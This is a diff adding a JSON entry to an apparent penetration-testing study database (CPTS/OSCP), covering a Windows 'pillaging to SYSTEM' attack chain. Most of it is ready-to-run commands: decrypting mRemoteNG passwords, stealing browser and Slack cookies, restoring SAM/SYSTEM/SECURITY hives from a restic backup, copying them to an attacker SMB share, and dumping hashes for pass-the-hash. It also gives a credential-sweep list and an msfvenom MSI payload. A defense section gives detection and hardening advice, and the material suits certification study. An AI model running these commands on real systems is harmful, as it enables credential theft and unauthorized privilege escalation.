@@ -1,0 +1,134 @@
+{
+  "type": "attack-chain",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tools": [
+    "mremoteng-decrypt",
+    "restic",
+    "secretsdump",
+    "impacket"
+  ],
+  "tags": [
+    "attack-chain",
+    "pillaging",
+    "pass-the-hash"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Attack Chains",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "1. Decrypt mRemoteNG creds from confCons.xml",
+      "command": "python3 mremoteng_decrypt.py -s \"<blob>\"   # -> next user's password"
+    },
+    {
+      "label": "2. Steal a Slack cookie / read chat for more creds",
+      "command": "Invoke-SharpChromium -Command \"cookies slack.com\""
+    },
+    {
+      "label": "3. restic password -> restore SAM/SYSTEM/SECURITY",
+      "command": "$env:RESTIC_PASSWORD='<pw>'; restic.exe -r E:\\restic restore <id> --target C:\\Restore"
+    },
+    {
+      "label": "4. Dump hashes and pass-the-hash to SYSTEM",
+      "command": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL; impacket-psexec Administrator@<ip> -hashes :<ntlm>"
+    }
+  ],
+  "notes": "=== Attack Chain: Pillaging → Credential Chain → SYSTEM ===\nSystematic post-exploitation sweep converting information access into privilege escalation.\n\n=== CHAIN OVERVIEW ===\nInitial low-priv foothold → Enumerate installed software → Find credential store → Decrypt/crack → Escalate\n\n=== PILLAGING PRIORITY ORDER ===\n1. cmdkey /list → immediate impersonation if saved creds exist (runas /savecred)\n2. reg query Winlogon → Autologon plaintext password\n3. (Get-PSReadLineOption).HistorySavePath | cat → PowerShell command history\n4. findstr credential sweep → config files, unattend.xml, web.config\n5. .\\lazagne.exe all → broadest credential sweep\n6. .\\SharpChrome.exe logins → browser saved passwords\n7. Get-ChildItem -Recurse *.kdbx → KeePass databases\n8. stickynotes query → plum.sqlite contents\n9. Get-LocalUser | Select Description → description field passwords\n10. mRemoteNG confCons.xml → remote access tool credentials\n\n=== INSTALLED SOFTWARE ENUMERATION (START HERE) ===\n  wmic product get name   → MSI-packaged software\n  dir \"C:\\Program Files\"  → quick visual sweep\n  dir \"C:\\Program Files (x86)\"\n  Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion\n\nHIGH-VALUE APPLICATIONS TO FIND:\n  mRemoteNG → confCons.xml with all server credentials\n  KeePass → .kdbx database with all org credentials\n  Druva inSync 6.6.3 → RPC command injection → SYSTEM\n  Any backup agent → admin access to all backed-up systems\n  Password managers (RoboForm, 1Password, Bitwarden desktop) → credential vault\n  Database clients (SQL Management Studio) → saved connection credentials\n\n=== CHAINING CONTEXT ===\nPillaging → KeePass master password → all org credentials → domain compromise\nPillaging → mRemoteNG confCons.xml → RDP credentials for DC → domain admin access\nPillaging → confCons.xml → SQL server credentials → xp_cmdshell → SYSTEM on SQL\nPillaging → browser cookies → Slack session → internal comms reveal network architecture\nPillaging → PS history → service account passwords → lateral movement\n\n=== ATTACKER MINDSET ===\nPillaging is not optional — run at EVERY privilege level on EVERY new system.\nThe same application installed by different users has different credential stores.\nEach new account compromise = restart the pillaging cycle for that user's context.\nBackup systems are single points aggregating access to all backed-up systems — always prioritize.",
+  "references": [
+    {
+      "title": "mRemoteNG-Decrypt",
+      "url": "https://github.com/haseebT/mRemoteNG-Decrypt"
+    },
+    {
+      "title": "Impacket",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "mremoteng-decrypt",
+      "note": "Step 1 credential decryption.",
+      "rel": "prereq"
+    },
+    {
+      "id": "restic-backup-restore",
+      "note": "Step 3 backup restoration.",
+      "rel": "prereq"
+    },
+    {
+      "id": "browser-cookie-theft",
+      "note": "Step 2 cookie theft.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "chain-pillaging-to-system",
+  "name": "Attack Chain - Pillaging to SYSTEM",
+  "command": "# mRemoteNG creds -> Slack cookie -> restic backup -> SAM/SYSTEM -> pass-the-hash",
+  "description": "The full Pillaging kill chain: harvest stored creds, pivot through users, restore backup hives, extract the Administrator hash, and pass-the-hash to SYSTEM.",
+  "steps": [
+    {
+      "label": "1. Decrypt mRemoteNG password",
+      "command": "python3 mremoteng_decrypt.py -s \"<confCons.xml blob>\""
+    },
+    {
+      "label": "2. Steal Firefox/Slack cookie",
+      "command": "copy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite .\npython3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d"
+    },
+    {
+      "label": "3. Get restic repo password (next user)",
+      "command": "type \"C:\\Users\\jeff\\Desktop\\backup conf.txt\""
+    },
+    {
+      "label": "4. Restore hives from backup",
+      "command": "$env:RESTIC_PASSWORD='Superbackup!'\nrestic.exe -r E:\\restic snapshots\nrestic.exe -r E:\\restic restore <id> --target C:\\Restore"
+    },
+    {
+      "label": "5. Exfil SAM/SYSTEM/SECURITY via SMB",
+      "command": "# Kali: sudo impacket-smbserver share . -smb2support -username kali -password kali\nnet use Z: \\\\<lhost>\\share /user:kali kali\ncopy \"C:\\Restore\\C\\Windows\\System32\\config\\SAM\" Z:\\"
+    },
+    {
+      "label": "6. Extract hash + pass-the-hash",
+      "command": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL\nimpacket-psexec Administrator@<ip> -hashes :<ntlm_hash>"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1003.002"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Pillaging chains stored secrets: one recovered credential unlocks the next. mRemoteNG's hardcoded default encryption key decrypts saved connection passwords; browser/chat cookies and config files leak further creds; a restic backup password ultimately exposes the SAM/SYSTEM/SECURITY hives, whose local hashes enable pass-the-hash to SYSTEM. No exploit is used — only secrets left on disk.",
+    "prerequisites": "An initial foothold on the host with read access to stored configs and backups, and either SYSTEM access to read the live SAM or a backup/shadow copy containing the SAM, SYSTEM, and SECURITY registry hives.",
+    "impact": "The local Administrator NTLM hash, replayed via pass-the-hash for SYSTEM/local-admin execution — and often the pivot creds to reach the next host in the chain.",
+    "detection": "[MITRE T1003.002 AN0235] An adversary with SYSTEM privileges executes commands or accesses registry keys to dump the SAM hive, or reads sensitive local files from the config directory — often sequential access to HKLM\\SAM and HKLM\\SYSTEM and the creation of .save/.dmp files for offline hash extraction. Also watch for `reg save hklm\\sam`, secretsdump execution, and pass-the-hash logons (Event 4624 Logon Type 3 / 4776 with NTLM from an unusual source).",
+    "artifacts": "Copied SAM/SYSTEM/SECURITY hive files (.save); impacket-secretsdump execution; access to mRemoteNG confCons.xml and browser cookie stores; SMB transfer of the hive files to an attacker share; a pass-the-hash logon using the local admin hash.",
+    "prevention": "[MITRE T1003.002 M1027 Password Policies] give every host a unique, complex local-admin password (LAPS) so one recovered local hash unlocks nothing else; [M1026 Privileged Account Management] never reuse domain-admin creds locally; [M1028 OS Configuration] restrict/disable NTLM; encrypt backups and never store backup passwords in cleartext; avoid saving passwords in tools like mRemoteNG.",
+    "evasion": "Restoring the hives from a backup avoids touching the live HKLM\\SAM (sidestepping SAM-access detection); relying only on stored secrets needs no exploit and blends with normal administrative activity.",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.002"
+    ],
+    "misconfiguration": "Windows systems accumulate privilege escalation paths over time: scheduled tasks running as SYSTEM with world-writable scripts, service binaries with weak DACL (non-admins can overwrite), AlwaysInstallElevated enabled (any MSI installs as SYSTEM), or SeImpersonatePrivilege granted to web/service accounts.",
+    "vulnerable_config": "# AlwaysInstallElevated (any user installs MSI as SYSTEM):\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# Both = 1  ->  msfvenom -p windows/exec CMD=calc.exe -f msi > priv.msi; msiexec /quiet /i priv.msi\n\n# Service binary with weak DACL:\nicacls C:\\Program Files\\VulnSvc\\svc.exe\n# BUILTIN\\Users:(F)  <-- any user has Full Control -> replace with malicious binary",
+    "secure_config": "# Disable AlwaysInstallElevated:\n# GPO: Computer Config > Admin Templates > Windows Components > Windows Installer\n#   'Always install with elevated privileges' = Disabled\n# Registry (both keys required):\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\n\n# Fix service binary DACLs:\nicacls 'C:\\Program Files\\VulnSvc\\svc.exe' /inheritance:r /grant:r 'NT AUTHORITY\\SYSTEM:(F)' 'BUILTIN\\Administrators:(F)'\n# Remove all non-admin write permissions\n\n# Audit with PowerUp or PrivescCheck:\n# Invoke-PrivescCheck -Thorough  # comprehensive privesc surface audit\n# Run monthly and after any software installation"
+  }
+}
